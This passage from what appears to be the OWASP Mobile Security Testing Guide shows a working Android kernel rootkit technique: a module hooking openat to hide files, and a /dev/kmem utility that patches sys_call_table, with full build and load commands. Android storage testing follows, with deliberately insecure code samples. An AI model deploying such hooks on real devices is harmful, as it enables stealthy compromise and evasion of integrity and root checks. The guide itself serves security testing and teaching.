\NormalTok{    printk(}\StringTok{"Hiding file!}\SpecialCharTok{\textbackslash{}n}\StringTok{"}\NormalTok{);}
    \ControlFlowTok{return}\NormalTok{ {-}ENOENT;}
\NormalTok{  \}}

\NormalTok{  kfree(kbuf);}

  \ControlFlowTok{return}\NormalTok{ real\_openat(dirfd, pathname, flags);}
\NormalTok{\}}

\DataTypeTok{int}\NormalTok{ init\_module() \{}

\NormalTok{  sys\_call\_table = (}\DataTypeTok{void}\NormalTok{*)}\BaseNTok{0xc000f984}\NormalTok{;}
\NormalTok{  real\_openat = (}\DataTypeTok{void}\NormalTok{*)(sys\_call\_table[\textbackslash{}\_\_NR\_openat]);}

\ControlFlowTok{return} \DecValTok{0}\NormalTok{;}

\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

To build the kernel module, you need the kernel sources and a working
toolchain. Since you've already built a complete kernel, you're all set.
Create a Makefile with the following content:

\begin{verbatim}
KERNEL=[YOUR KERNEL PATH]
TOOLCHAIN=[YOUR TOOLCHAIN PATH]

obj-m := kernel_hook.o

all:
        make ARCH=arm CROSS_COMPILE=$(TOOLCHAIN)/bin/arm-eabi- -C $(KERNEL) M=$(shell pwd) CFLAGS_MODULE=-fno-pic modules

clean:
        make -C $(KERNEL) M=$(shell pwd) clean
\end{verbatim}

Run make to compile the code---this should create the file
kernel\_hook.ko. Copy kernel\_hook.ko to the device and load it with the
\texttt{insmod} command. Using the \texttt{lsmod} command, verify that
the module has been loaded successfully.

\begin{verbatim}
$ make
(...)
$ adb push kernel_hook.ko /data/local/tmp/
[100%] /data/local/tmp/kernel_hook.ko
$ adb shell su -c insmod /data/local/tmp/kernel_hook.ko
$ adb shell lsmod
kernel_hook 1160 0 [permanent], Live 0xbf000000 (PO)
\end{verbatim}

Now you'll access /dev/kmem to overwrite the original function pointer
in \texttt{sys\_call\_table} with the address of your newly injected
function (this could have been done directly in the kernel module, but
/dev/kmem provides an easy way to toggle your hooks on and off). We've
have adapted the code from Dong-Hoon You's Phrack article for this
purpose. However, you can use the file interface instead of
\texttt{mmap} because the latter might cause kernel panics. Create a
file called kmem\_util.c with the following code:

\begin{Shaded}
\begin{Highlighting}[]
\PreprocessorTok{\#include }\ImportTok{<stdio.h>}
\PreprocessorTok{\#include }\ImportTok{<stdlib.h>}
\PreprocessorTok{\#include }\ImportTok{<fcntl.h>}
\PreprocessorTok{\#include }\ImportTok{<asm/unistd.h>}
\PreprocessorTok{\#include }\ImportTok{<sys/mman.h>}

\PreprocessorTok{\#define MAP\_SIZE 4096UL}
\PreprocessorTok{\#define MAP\_MASK (MAP\_SIZE {-} 1)}

\DataTypeTok{int}\NormalTok{ kmem;}
\DataTypeTok{void}\NormalTok{ read\_kmem2(}\DataTypeTok{unsigned} \DataTypeTok{char}\NormalTok{ *buf, off\_t off, }\DataTypeTok{int}\NormalTok{ sz)}
\NormalTok{\{}
\NormalTok{  off\_t offset; }\DataTypeTok{ssize\_t}\NormalTok{ bread;}
\NormalTok{  offset = lseek(kmem, off, SEEK\_SET);}
\NormalTok{  bread = read(kmem, buf, sz);}
  \ControlFlowTok{return}\NormalTok{;}
\NormalTok{\}}

\DataTypeTok{void}\NormalTok{ write\_kmem2(}\DataTypeTok{unsigned} \DataTypeTok{char}\NormalTok{ *buf, off\_t off, }\DataTypeTok{int}\NormalTok{ sz) \{}
\NormalTok{  off\_t offset; }\DataTypeTok{ssize\_t}\NormalTok{ written;}
\NormalTok{  offset = lseek(kmem, off, SEEK\_SET);}
  \ControlFlowTok{if}\NormalTok{ (written = write(kmem, buf, sz) == {-}}\DecValTok{1}\NormalTok{) \{ perror(}\StringTok{"Write error"}\NormalTok{);}
\NormalTok{    exit(}\DecValTok{0}\NormalTok{);}
\NormalTok{  \}}
  \ControlFlowTok{return}\NormalTok{;}
\NormalTok{\}}

\DataTypeTok{int}\NormalTok{ main(}\DataTypeTok{int}\NormalTok{ argc, }\DataTypeTok{char}\NormalTok{ *argv[]) \{}

\NormalTok{  off\_t sys\_call\_table;}
  \DataTypeTok{unsigned} \DataTypeTok{int}\NormalTok{ addr\_ptr, sys\_call\_number;}

  \ControlFlowTok{if}\NormalTok{ (argc < }\DecValTok{3}\NormalTok{) \{}
    \ControlFlowTok{return} \DecValTok{0}\NormalTok{;}
\NormalTok{  \}}

\NormalTok{  kmem=open(}\StringTok{"/dev/kmem"}\NormalTok{,O\_RDWR);}

  \ControlFlowTok{if}\NormalTok{(kmem<}\DecValTok{0}\NormalTok{)\{}
\NormalTok{    perror(}\StringTok{"Error opening kmem"}\NormalTok{); }\ControlFlowTok{return} \DecValTok{0}\NormalTok{;}
\NormalTok{  \}}

\NormalTok{  sscanf(argv[}\DecValTok{1}\NormalTok{], }\StringTok{"\%x"}\NormalTok{, \&sys\_call\_table); sscanf(argv[}\DecValTok{2}\NormalTok{], }\StringTok{"\%d"}\NormalTok{, \&sys\_call\_number);}
\NormalTok{  sscanf(argv[}\DecValTok{3}\NormalTok{], }\StringTok{"\%x"}\NormalTok{, \&addr\_ptr); }\DataTypeTok{char}\NormalTok{ buf[}\DecValTok{256}\NormalTok{];}
\NormalTok{  memset (buf, }\DecValTok{0}\NormalTok{, }\DecValTok{256}\NormalTok{); read\_kmem2(buf,sys\_call\_table+(sys\_call\_number*}\DecValTok{4}\NormalTok{),}\DecValTok{4}\NormalTok{);}
\NormalTok{  printf(}\StringTok{"Original value: \%02x\%02x\%02x\%02x}\SpecialCharTok{\textbackslash{}n}\StringTok{"}\NormalTok{, buf[}\DecValTok{3}\NormalTok{], buf[}\DecValTok{2}\NormalTok{], buf[}\DecValTok{1}\NormalTok{], buf[}\DecValTok{0}\NormalTok{]);}
\NormalTok{  write\_kmem2((}\DataTypeTok{void}\NormalTok{*)\&addr\_ptr,sys\_call\_table+(sys\_call\_number*}\DecValTok{4}\NormalTok{),}\DecValTok{4}\NormalTok{);}
\NormalTok{  read\_kmem2(buf,sys\_call\_table+(sys\_call\_number*}\DecValTok{4}\NormalTok{),}\DecValTok{4}\NormalTok{);}
\NormalTok{  printf(}\StringTok{"New value: \%02x\%02x\%02x\%02x}\SpecialCharTok{\textbackslash{}n}\StringTok{"}\NormalTok{, buf[}\DecValTok{3}\NormalTok{], buf[}\DecValTok{2}\NormalTok{], buf[}\DecValTok{1}\NormalTok{], buf[}\DecValTok{0}\NormalTok{]);}
\NormalTok{  close(kmem);}

  \ControlFlowTok{return} \DecValTok{0}\NormalTok{;}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Beginning with Android 5.0 (API level 21), all executables must be
compiled with PIE support. Build kmem\_util.c with the prebuilt
toolchain and copy it to the device:

\begin{verbatim}
$ /tmp/my-android-toolchain/bin/arm-linux-androideabi-gcc -pie -fpie -o kmem_util kmem_util.c
$ adb push kmem_util /data/local/tmp/
$ adb shell chmod 755 /data/local/tmp/kmem_util
\end{verbatim}

Before you start accessing kernel memory, you still need to know the
correct offset into the system call table. The \texttt{openat} system
call is defined in unistd.h, which is in the kernel sources:

\begin{verbatim}
$ grep -r "__NR_openat" arch/arm/include/asm/unistd.h
\#define __NR_openat            (__NR_SYSCALL_BASE+322)
\end{verbatim}

The final piece of the puzzle is the address of your
replacement-\texttt{openat}. Again, you can get this address from
/proc/kallsyms.

\begin{verbatim}
$ adb shell cat /proc/kallsyms | grep new_openat
bf000000 t new_openat    [kernel_hook]
\end{verbatim}

Now you have everything you need to overwrite the
\texttt{sys\_call\_table} entry. The syntax for kmem\_util is:

\begin{verbatim}
$ ./kmem_util <syscall_table_base_address> <offset> <func_addr>
\end{verbatim}

The following command patches the \texttt{openat} system call table so
that it points to your new function.

\begin{verbatim}
$ adb shell su -c /data/local/tmp/kmem_util c000f984 322 bf000000
Original value: c017a390
New value: bf000000
\end{verbatim}

Assuming that everything worked, /bin/cat shouldn't be able to
\emph{see} the file.

\begin{verbatim}
$ adb shell su -c cat /data/local/tmp/nowyouseeme
tmp-mksh: cat: /data/local/tmp/nowyouseeme: No such file or directory
\end{verbatim}

Voilà! The file ``nowyouseeme'' is now somewhat hidden from all
\emph{user mode} processes. Note that the file can easily be found using
other syscalls, and you need to do a lot more to properly hide a file,
including hooking \texttt{stat}, \texttt{access}, and other system
calls.

File-hiding is of course only the tip of the iceberg: you can accomplish
a lot using kernel modules, including bypassing many root detection
measures, integrity checks, and anti-debugging measures. You can find
more examples in the ``case studies'' section of Bernhard Mueller's
Hacking Soft Tokens Paper {[}\#mueller{]}.

\hypertarget{references-8}{%
\subsubsection{References}\label{references-8}}

\begin{itemize}
\tightlist
\item
  Bionic - \url{https://github.com/android/platform_bionic}
\item
  Attacking Android Applications with Debuggers (19 January 2015) -
  \url{https://blog.netspi.com/attacking-android-applications-with-debuggers/}
\item
  {[}\#josse{]} Sébastien Josse, Dynamic Malware Recompilation (6
  January 2014) - \url{http://ieeexplore.ieee.org/document/6759227/}
\item
  Update on Development of Xposed for Nougat -
  \url{https://www.xda-developers.com/rovo89-updates-on-the-situation-regarding-xposed-for-nougat/}
\item
  Android Platform based Linux kernel rootkit (4 April 2011 - Phrack
  Magazine)
\item
  {[}\#mueller{]} Bernhard Mueller, Hacking Soft Tokens. Advanced
  Reverse Engineering on Android (2016) -
  \url{https://packetstormsecurity.com/files/138504/HITB_Hacking_Soft_Tokens_v1.2.pdf}
\end{itemize}

\hypertarget{tools-4}{%
\paragraph{Tools}\label{tools-4}}

\begin{itemize}
\tightlist
\item
  Angr - \url{https://angr.io/}
\item
  APKEnum - \url{https://github.com/shivsahni/APKEnum}
\item
  apktool - \url{https://github.com/iBotPeaches/Apktool}
\item
  apkx - \url{https://github.com/b-mueller/apkx}
\item
  CFR Decompiler - \url{https://www.benf.org/other/cfr/}
\item
  Dextra - \url{http://newandroidbook.com/tools/dextra.html}
\item
  IDA Pro - \url{https://www.hex-rays.com/products/ida/}
\item
  JAD Decompiler - \url{http://www.javadecompilers.com/jad}
\item
  jadx - \url{https://github.com/skylot/jadx}
\item
  JD (Java Decompiler) - \url{http://jd.benow.ca/}
\item
  JEB Decompiler - \url{https://www.pnfsoftware.com}
\item
  OWASP Mobile Testing Guide Crackmes -
  \url{https://github.com/OWASP/owasp-mstg/blob/master/Crackmes/}
\item
  Procyon Decompiler -
  \url{https://bitbucket.org/mstrobel/procyon/overview}
\item
  Radare2 - \url{https://www.radare.org}
\item
  smalidea plugin for IntelliJ -
  \url{https://github.com/JesusFreke/smali/wiki/smalidea}
\item
  VxStripper - \url{http://vxstripper.pagesperso-orange.fr}
\end{itemize}

\hypertarget{data-storage-on-android}{%
\subsection{Data Storage on Android}\label{data-storage-on-android}}

Protecting authentication tokens, private information, and other
sensitive data is key to mobile security. In this chapter, you will
learn about the APIs Android offers for local data storage and best
practices for using them.

The guidelines for saving data can be summarized quite easily: Public
data should be available to everyone, but sensitive and private data
must be protected, or, better yet, kept out of device storage.

Note that the meaning of ``sensitive data'' depends on the app that
handles it. Data classification is described in detail in the
``\href{0x04b-Mobile-App-Security-Testing.md\#identifying-sensitive-data}{Identifying
Sensitive Data}'' section of the chapter ``Mobile App Security
Testing''.

Next to protecting sensitive data, you need to ensure that data read
from any storage source is validated and possibly sanitized. The
validation often does not go beyond ensuring that the data presented is
of the type requested, but with using additional cryptographic controls,
such as an HMAC, you can validate the correctness of the data.

\hypertarget{testing-local-storage-for-sensitive-data-mstg-storage-1-and-mstg-storage-2}{%
\subsubsection{Testing Local Storage for Sensitive Data (MSTG-STORAGE-1
and
MSTG-STORAGE-2)}\label{testing-local-storage-for-sensitive-data-mstg-storage-1-and-mstg-storage-2}}

\hypertarget{overview-4}{%
\paragraph{Overview}\label{overview-4}}

Conventional wisdom suggests that as little sensitive data as possible
should be stored on permanent local storage. In most practical
scenarios, however, some type of user data must be stored. For example,
asking the user to enter a very complex password every time the app
starts isn't a great idea in terms of usability. Most apps must locally
cache some kind of authentication token to avoid this. Personally
identifiable information (PII) and other types of sensitive data may
also be saved if a given scenario calls for it.

Sensitive data is vulnerable when it is not properly protected by the
app that is persistently storing it. The app may be able to store the
data in several places, for example, on the device or on an external SD
card. When you're trying to exploit these kinds of issues, consider that
a lot of information may be processed and stored in different locations.
Identifying at the outset the kind of information processed by the
mobile application and input by the user is important. Identifying
information that may be valuable to attackers (e.g., passwords, credit
card information, PII) is also important.

Disclosing sensitive information has several consequences, including
decrypted information. In general, an attacker may identify this
information and use it for additional attacks, such as social
engineering (if PII has been disclosed), account hijacking (if session
information or an authentication token has been disclosed), and
gathering information from apps that have a payment option (to attack
and abuse them).

\href{https://developer.android.com/guide/topics/data/data-storage.html}{Storing
data} is essential for many mobile apps. For example, some apps use data
storage to keep track of user settings or user-provided data. Data can
be stored persistently in several ways. The following list of storage
techniques are widely used on the Android platform:

\begin{itemize}
\tightlist
\item
  Shared Preferences
\item
  SQLite Databases
\item
  Realm Databases
\item
  Internal Storage
\item
  External Storage
\end{itemize}

The following code snippets demonstrate bad practices that disclose
sensitive information. They also illustrate Android storage mechanisms
in detail. For more information, check out the
\href{https://developer.android.com/training/articles/security-tips.html\#StoringData}{Security
Tips for Storing Data} in the Android developer's guide.

\hypertarget{shared-preferences}{%
\subparagraph{Shared Preferences}\label{shared-preferences}}

The SharedPreferences API is commonly used to permanently save small
collections of key-value pairs. Data stored in a SharedPreferences
object is written to a plain-text XML file. The SharedPreferences object
can be declared world-readable (accessible to all apps) or private.
Misuse of the SharedPreferences API can often lead to exposure of
sensitive data. Consider the following example:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{SharedPreferences sharedPref = }\FunctionTok{getSharedPreferences}\NormalTok{(}\StringTok{"key"}\NormalTok{, MODE\_WORLD\_READABLE);}
\NormalTok{SharedPreferences.}\FunctionTok{Editor}\NormalTok{ editor = sharedPref.}\FunctionTok{edit}\NormalTok{();}
\NormalTok{editor.}\FunctionTok{putString}\NormalTok{(}\StringTok{"username"}\NormalTok{, }\StringTok{"administrator"}\NormalTok{);}
\NormalTok{editor.}\FunctionTok{putString}\NormalTok{(}\StringTok{"password"}\NormalTok{, }\StringTok{"supersecret"}\NormalTok{);}
\NormalTok{editor.}\FunctionTok{commit}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

Once the activity has been called, the file key.xml will be created with
the provided data. This code violates several best practices.

\begin{itemize}
\tightlist
\item
  The username and password are stored in clear text in
  \texttt{/data/data/\textless{}package-name\textgreater{}/shared\_prefs/key.xml}.
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<?xml}\NormalTok{ version=\textquotesingle{}1.0\textquotesingle{} encoding=\textquotesingle{}utf{-}8\textquotesingle{} standalone=\textquotesingle{}yes\textquotesingle{} }\KeywordTok{?>}
\KeywordTok{<map>}
  \KeywordTok{<string}\OtherTok{ name=}\StringTok{"username"}\KeywordTok{>}\NormalTok{administrator}\KeywordTok{</string>}
  \KeywordTok{<string}\OtherTok{ name=}\StringTok{"password"}\KeywordTok{>}\NormalTok{supersecret}\KeywordTok{</string>}
\KeywordTok{</map>}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  \texttt{MODE\_WORLD\_READABLE} allows all applications to access and
  read the contents of \texttt{key.xml}.
\end{itemize}

\begin{verbatim}
root@hermes:/data/data/sg.vp.owasp_mobile.myfirstapp/shared_prefs # ls -la
-rw-rw-r-- u0_a118    170 2016-04-23 16:51 key.xml
\end{verbatim}

\begin{quote}
Please note that \texttt{MODE\_WORLD\_READABLE} and
\texttt{MODE\_WORLD\_WRITEABLE} were deprecated starting on API level
17. Although newer devices may not be affected by this, applications
compiled with an \texttt{android:targetSdkVersion} value less than 17
may be affected if they run on an OS version that was released before
Android 4.2 (API level 17).
\end{quote}

\hypertarget{sqlite-database-unencrypted}{%
\subparagraph{SQLite Database
(Unencrypted)}\label{sqlite-database-unencrypted}}

SQLite is an SQL database engine that stores data in \texttt{.db} files.
The Android SDK has built-in support for SQLite databases. The main
package used to manage the databases is
\texttt{android.database.sqlite}. You may use the following code to
store sensitive information within an activity:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{SQLiteDatabase notSoSecure = }\FunctionTok{openOrCreateDatabase}\NormalTok{(}\StringTok{"privateNotSoSecure"}\NormalTok{, MODE\_PRIVATE, }\KeywordTok{null}\NormalTok{);}
\NormalTok{notSoSecure.}\FunctionTok{execSQL}\NormalTok{(}\StringTok{"CREATE TABLE IF NOT EXISTS Accounts(Username VARCHAR, Password VARCHAR);"}\NormalTok{);}
\NormalTok{notSoSecure.}\FunctionTok{execSQL}\NormalTok{(}\StringTok{"INSERT INTO Accounts VALUES(\textquotesingle{}admin\textquotesingle{},\textquotesingle{}AdminPass\textquotesingle{});"}\NormalTok{);}
\NormalTok{notSoSecure.}\FunctionTok{close}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

Once the activity has been called, the database file
\texttt{privateNotSoSecure} will be created with the provided data and
stored in the clear text file
\texttt{/data/data/\textless{}package-name\textgreater{}/databases/privateNotSoSecure}.

The database's directory may contain several files besides the SQLite
database:

\begin{itemize}
\tightlist
\item
  \href{https://www.sqlite.org/tempfiles.html}{Journal files}: These are
  temporary files used to implement atomic commit and rollback.
\item
  \href{https://www.sqlite.org/lockingv3.html}{Lock files}: The lock
  files are part of the locking and journaling feature, which was
  designed to improve SQLite concurrency and reduce the writer
  starvation problem.
\end{itemize}

Sensitive information should not be stored in unencrypted SQLite
databases.

\hypertarget{sqlite-databases-encrypted}{%
\subparagraph{SQLite Databases
(Encrypted)}\label{sqlite-databases-encrypted}}

With the library
\href{https://www.zetetic.net/sqlcipher/sqlcipher-for-android/}{SQLCipher},
SQLite databases can be password-encrypted.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{SQLiteDatabase secureDB = SQLiteDatabase.}\FunctionTok{openOrCreateDatabase}\NormalTok{(database, }\StringTok{"password123"}\NormalTok{, }\KeywordTok{null}\NormalTok{);}
\NormalTok{secureDB.}\FunctionTok{execSQL}\NormalTok{(}\StringTok{"CREATE TABLE IF NOT EXISTS Accounts(Username VARCHAR,Password VARCHAR);"}\NormalTok{);}
\NormalTok{secureDB.}\FunctionTok{execSQL}\NormalTok{(}\StringTok{"INSERT INTO Accounts VALUES(\textquotesingle{}admin\textquotesingle{},\textquotesingle{}AdminPassEnc\textquotesingle{});"}\NormalTok{);}
\NormalTok{secureDB.}\FunctionTok{close}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

If encrypted SQLite databases are used, determine whether the password
is hard-coded in the source, stored in shared preferences, or hidden
somewhere else in the code or filesystem. Secure ways to retrieve the
key include:

\begin{itemize}
\tightlist
\item
  Asking the user to decrypt the database with a PIN or password once
  the app is opened (weak passwords and PINs are vulnerable to brute
  force attacks)
\item
  Storing the key on the server and allowing it to be accessed from a
  web service only (so that the app can be used only when the device is
  online)
\end{itemize}

\hypertarget{firebase-real-time-databases}{%
\subparagraph{Firebase Real-time
Databases}\label{firebase-real-time-databases}}

Firebase is a development platform with more than 15 products, and one
of them is Firebase Real-time Database. It can be leveraged by
application developers to store and sync data with a NoSQL cloud-hosted
database. The data is stored as JSON and is synchronized in real-time to
every connected client and also remains available even when the
application goes offline.

A misconfigured Firebase instance can be identified by making the
following network call:

\texttt{https://\textbackslash{}\textless{}firebaseProjectName\textbackslash{}\textgreater{}.firebaseio.com/.json}

The \emph{firebaseProjectName} can be retrieved from the mobile
application by reverse engineering the application. Alternatively, the
analysts can use
\href{https://github.com/shivsahni/FireBaseScanner}{Firebase Scanner}, a
python script that automates the task above as shown below:

\begin{verbatim}
python FirebaseScanner.py -p <pathOfAPKFile>

python FirebaseScanner.py -f <commaSeperatedFirebaseProjectNames>
\end{verbatim}

\hypertarget{realm-databases}{%
\subparagraph{Realm Databases}\label{realm-databases}}

The \href{https://realm.io/docs/java/latest/}{Realm Database for Java}
is becoming more and more popular among developers. The database and its
contents can be encrypted with a key stored in the configuration file.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{//the getKey() method either gets the key from the server or from a KeyStore, or is derived from a password.}
\NormalTok{RealmConfiguration config = }\KeywordTok{new}\NormalTok{ RealmConfiguration.}\FunctionTok{Builder}\NormalTok{()}
\NormalTok{  .}\FunctionTok{encryptionKey}\NormalTok{(}\FunctionTok{getKey}\NormalTok{())}
\NormalTok{  .}\FunctionTok{build}\NormalTok{();}

\NormalTok{Realm realm = Realm.}\FunctionTok{getInstance}\NormalTok{(config);}
\end{Highlighting}
\end{Shaded}

If the database is not encrypted, you should be able to obtain the data.
If the database \emph{is} encrypted, determine whether the key is
hard-coded in the source or resources and whether it is stored
unprotected in shared preferences or some other location.

\hypertarget{internal-storage}{%
\subparagraph{Internal Storage}\label{internal-storage}}

You can save files to the device's
\href{https://developer.android.com/guide/topics/data/data-storage.html\#filesInternal}{internal
storage}. Files saved to internal storage are containerized by default
and cannot be accessed by other apps on the device. When the user
uninstalls your app, these files are removed. The following code
snippets would persistently store sensitive data to internal storage.

Example for Java:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{FileOutputStream}\NormalTok{ fos = }\KeywordTok{null}\NormalTok{;}
\KeywordTok{try}\NormalTok{ \{}
\NormalTok{   fos = }\FunctionTok{openFileOutput}\NormalTok{(FILENAME, }\BuiltInTok{Context}\NormalTok{.}\FunctionTok{MODE\_PRIVATE}\NormalTok{);}
\NormalTok{   fos.}\FunctionTok{write}\NormalTok{(test.}\FunctionTok{getBytes}\NormalTok{());}
\NormalTok{   fos.}\FunctionTok{close}\NormalTok{();}
\NormalTok{\} }\KeywordTok{catch}\NormalTok{ (}\BuiltInTok{FileNotFoundException}\NormalTok{ e) \{}
\NormalTok{   e.}\FunctionTok{printStackTrace}\NormalTok{();}
\NormalTok{\} }\KeywordTok{catch}\NormalTok{ (}\BuiltInTok{IOException}\NormalTok{ e) \{}
\NormalTok{   e.}\FunctionTok{printStackTrace}\NormalTok{();}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Example for Kotlin:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{var} \VariableTok{fos}\NormalTok{: FileOutputStream? = }\KeywordTok{null}
\NormalTok{fos = openFileOutput(}\StringTok{"FILENAME"}\NormalTok{, Context.MODE\_PRIVATE)}
\NormalTok{fos.write(test.toByteArray(Charsets.UTF\_}\DecValTok{8}\NormalTok{))}
\NormalTok{fos.close()}
\end{Highlighting}
\end{Shaded}

You should check the file mode to make sure that only the app can access
the file. You can set this access with \texttt{MODE\_PRIVATE}. Modes
such as \texttt{MODE\_WORLD\_READABLE} (deprecated) and
\texttt{MODE\_WORLD\_WRITEABLE} (deprecated) may pose a security risk.

Search for the class \texttt{FileInputStream} to find out which files
are opened and read within the app.

\hypertarget{external-storage}{%
\subparagraph{External Storage}\label{external-storage}}

Every Android-compatible device supports
\href{https://developer.android.com/guide/topics/data/data-storage.html\#filesExternal}{shared
external storage}. This storage may be removable (such as an SD card) or
internal (non-removable). Files saved to external storage are
world-readable. The user can modify them when USB mass storage is
enabled. You can use the following code snippets to persistently store
sensitive information to external storage as the contents of the file
\texttt{password.txt}.

Example for Java:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{File}\NormalTok{ file = }\KeywordTok{new} \BuiltInTok{File}\NormalTok{ (}\BuiltInTok{Environment}\NormalTok{.}\FunctionTok{getExternalFilesDir}\NormalTok{(), }\StringTok{"password.txt"}\NormalTok{);}
\BuiltInTok{String}\NormalTok{ password = }\StringTok{"SecretPassword"}\NormalTok{;}
\BuiltInTok{FileOutputStream}\NormalTok{ fos;}
\NormalTok{    fos = }\KeywordTok{new} \BuiltInTok{FileOutputStream}\NormalTok{(file);}
\NormalTok{    fos.}\FunctionTok{write}\NormalTok{(password.}\FunctionTok{getBytes}\NormalTok{());}
\NormalTok{    fos.}\FunctionTok{close}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

Example for Kotlin:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{val} \VariableTok{password}\NormalTok{ = }\StringTok{"SecretPassword"}
\KeywordTok{val} \VariableTok{path}\NormalTok{ = context.getExternalFilesDir(}\KeywordTok{null}\NormalTok{)}
\KeywordTok{val} \VariableTok{file}\NormalTok{ = File(path, }\StringTok{"password.txt"}\NormalTok{)}
\NormalTok{file.appendText(password)}
\end{Highlighting}
\end{Shaded}

The file will be created and the data will be stored in a clear text
file in external storage once the activity has been called.

It's also worth knowing that files stored outside the application folder
(\texttt{data/data/\textless{}package-name\textgreater{}/}) will not be
deleted when the user uninstalls the application. Finally, it's worth
noting that the external storage can be used by an attacker to allow for
arbitrary control of the application in some cases. For more
information:
\href{https://blog.checkpoint.com/2018/08/12/man-in-the-disk-a-new-attack-surface-for-android-apps/}{see
the blog from Checkpoint}.

\hypertarget{static-analysis-11}{%
\paragraph{Static Analysis}\label{static-analysis-11}}

\hypertarget{local-storage}{%
\subparagraph{Local Storage}\label{local-storage}}

As previously mentioned, there are several ways to store information on
an Android device. You should therefore check several sources to
determine the kind of storage used by the Android app and to find out
whether the app processes sensitive data insecurely.

\begin{itemize}
\tightlist
\item
  Check \texttt{AndroidManifest.xml} for read/write external storage
  permissions, for example,
  \texttt{uses-permission\ android:name="android.permission.WRITE\_EXTERNAL\_STORAGE"}.
\item
  Check the source code for keywords and API calls that are used to
  store data:

  \begin{itemize}
  \tightlist
  \item
    File permissions, such as:

    \begin{itemize}
    \tightlist
    \item
      \texttt{MODE\_WORLD\_READABLE} or \texttt{MODE\_WORLD\_WRITABLE}:
      You should avoid using \texttt{MODE\_WORLD\_WRITEABLE} and
      \texttt{MODE\_WORLD\_READABLE} for files because any app will be
      able to read from or write to the files, even if they are stored
      in the app's private data directory. If data must be shared with
      other applications, consider a content provider. A content
      provider offers read and write permissions to other apps and can
      grant dynamic permission on a case-by-case basis.
    \end{itemize}
  \item
    Classes and functions, such as:

    \begin{itemize}
    \tightlist
    \item
      the \texttt{SharedPreferences} class ( stores key-value pairs)
    \item
      the \texttt{FileOutPutStream} class (uses internal or external
      storage)
    \item
      the \texttt{getExternal*} functions (use external storage)
    \item
      the \texttt{getWritableDatabase} function (returns a
      SQLiteDatabase for writing)
    \item
      the \texttt{getReadableDatabase} function (returns a
      SQLiteDatabase for reading)
    \item
      the \texttt{getCacheDir} and \texttt{getExternalCacheDirs}
      function (use cached files)
    \end{itemize}
  \end{itemize}
\end{itemize}

Encryption should be implemented using proven SDK functions. The
following describes bad practices to look for in the source code:

\begin{itemize}
\tightlist
\item
  Locally stored sensitive information ``encrypted'' via simple bit
  operations like XOR or bit flipping. These operations should be
  avoided because the encrypted data can be recovered easily.
\item
  Keys used or created without Android onboard features, such as the
  Android KeyStore
\item
  Keys disclosed by hard-coding
\end{itemize}

A typical misuse are hard-coded cryptographic keys. Hard-coded and
world-readable cryptographic keys significantly increase the possibility
that encrypted data will be recovered. Once an attacker obtains the
data, decrypting it is trivial. Symmetric cryptography keys must be
stored on the device, so identifying them is just a matter of time and
effort. Consider the following code:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{this}\NormalTok{.}\FunctionTok{db}\NormalTok{ = localUserSecretStore.}\FunctionTok{getWritableDatabase}\NormalTok{(}\StringTok{"SuperPassword123"}\NormalTok{);}
\end{Highlighting}
\end{Shaded}

Obtaining the key is trivial because it is contained in the source code
and identical for all installations of the app. Encrypting data this way
is not beneficial. Look for hard-coded API keys/private keys and other
valuable data; they pose a similar risk. Encoded/encrypted keys
represent another attempt to make it harder but not impossible to get
the crown jewels.

Consider the following code:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{//A more complicated effort to store the XOR\textquotesingle{}ed halves of a key (instead of the key itself)}
\KeywordTok{private} \DataTypeTok{static} \DataTypeTok{final} \BuiltInTok{String}\NormalTok{[] myCompositeKey = }\KeywordTok{new} \BuiltInTok{String}\NormalTok{[]\{}
  \StringTok{"oNQavjbaNNSgEqoCkT9Em4imeQQ="}\NormalTok{,}\StringTok{"3o8eFOX4ri/F8fgHgiy/BS47"}
\NormalTok{\};}
\end{Highlighting}
\end{Shaded}

The algorithm for decoding the original key might be something like
this:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \DataTypeTok{void} \FunctionTok{useXorStringHiding}\NormalTok{(}\BuiltInTok{String}\NormalTok{ myHiddenMessage) \{}
  \DataTypeTok{byte}\NormalTok{[] xorParts0 = Base64.}\FunctionTok{decode}\NormalTok{(myCompositeKey[}\DecValTok{0}\NormalTok{],}\DecValTok{0}\NormalTok{);}
  \DataTypeTok{byte}\NormalTok{[] xorParts1 = Base64.}\FunctionTok{decode}\NormalTok{(myCompositeKey[}\DecValTok{1}\NormalTok{],}\DecValTok{0}\NormalTok{);}

  \DataTypeTok{byte}\NormalTok{[] xorKey = }\KeywordTok{new} \DataTypeTok{byte}\NormalTok{[xorParts0.}\FunctionTok{length}\NormalTok{];}
  \KeywordTok{for}\NormalTok{(}\DataTypeTok{int}\NormalTok{ i = }\DecValTok{0}\NormalTok{; i < xorParts1.}\FunctionTok{length}\NormalTok{; i++)\{}
\NormalTok{    xorKey[i] = (}\DataTypeTok{byte}\NormalTok{) (xorParts0[i] \^{} xorParts1[i]);}
\NormalTok{  \}}
\NormalTok{  HidingUtil.}\FunctionTok{doHiding}\NormalTok{(myHiddenMessage.}\FunctionTok{getBytes}\NormalTok{(), xorKey, }\KeywordTok{false}\NormalTok{);}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Verify common locations of secrets:

\begin{itemize}
\item
  resources (typically at res/values/strings.xml) Example:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<resources>}
    \KeywordTok{<string}\OtherTok{ name=}\StringTok{"app\_name"}\KeywordTok{>}\NormalTok{SuperApp}\KeywordTok{</string>}
